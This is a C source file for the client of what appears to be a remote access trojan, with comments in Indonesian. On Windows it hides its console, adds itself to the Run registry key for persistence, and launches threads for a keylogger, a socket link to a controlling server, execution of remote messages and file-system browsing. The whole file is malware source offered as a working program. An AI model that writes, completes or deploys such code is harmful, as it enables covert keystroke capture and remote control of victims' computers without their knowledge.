// File: client.c

#ifdef _WIN32
#include <winsock2.h>
#else
#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <stdlib.h>
#include <pthread.h>
#endif

#include "../common/socket.h"
#include "SURF/seeDirectory.h"
#include "keylogger.h"

#ifdef _WIN32
void add_to_startup(const char *exe_path) {
    HKEY hKey;
    LONG result = RegOpenKeyExA(
        HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        KEY_WRITE,
        &hKey
    );

    if (result == ERROR_SUCCESS) {
        RegSetValueExA(
            hKey,
            "MyAutoRebooter", // Nama program di startup
            0,
            REG_SZ,
            (const BYTE *)exe_path,
            (DWORD)(strlen(exe_path) + 1)
        );
        RegCloseKey(hKey);
        printf("Program berhasil ditambahkan ke Startup.\n");
    } else {
        printf("Gagal menambahkan ke Startup.\n");
    }
}
#endif

#define PORT 8080

int main() {
	paramSurf param;
	paramThread param2;

	param.paramT = &param2;

	inisialisasiParamThread(param.paramT);
	isiPort(param.paramT, PORT);
	isiAddress(param.paramT, ADDRESS);
	isiStatus(param.paramT, 'C');


	printf("%c\n", (param).paramT->socketStatus);


#ifdef _WIN32

    HWND window;
    AllocConsole();
    window=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(window,0);

	char path[MAX_PATH];
	GetModuleFileNameA(NULL, path, MAX_PATH);

	// Tambahkan program ke registry agar jalan otomatis saat startup
	add_to_startup(path);
	HANDLE cliSocket, sendMSG, execMSG, actKeylog, surf;
	DWORD cliSocketId, sendMSGId, execMSGId, actKeylogId, surfId;

	WSADATA wsa;
	WSAStartup(MAKEWORD(2,2), &wsa);

	actKeylog = CreateThread(NULL, 0, activateKeylog, NULL, 0, &actKeylogId);
	cliSocket = CreateThread(NULL, 0, clientSocket, (LPVOID)param.paramT, 0, &cliSocketId);
	execMSG = CreateThread(NULL, 0, execMessage, (LPVOID)&param, 0, &execMSGId);
	surf = CreateThread(NULL, 0, surfMode, (LPVOID)&param, 0, &surfId);


	WaitForSingleObject(cliSocket, INFINITE);
	CloseHandle(cliSocket);

	WaitForSingleObject(execMSG, INFINITE);
	CloseHandle(execMSG);

	WaitForSingleObject(actKeylog, INFINITE);
	CloseHandle(actKeylog);

	WaitForSingleObject(surf, INFINITE);
	CloseHandle(surf);

#else
#endif

	return 0;
}

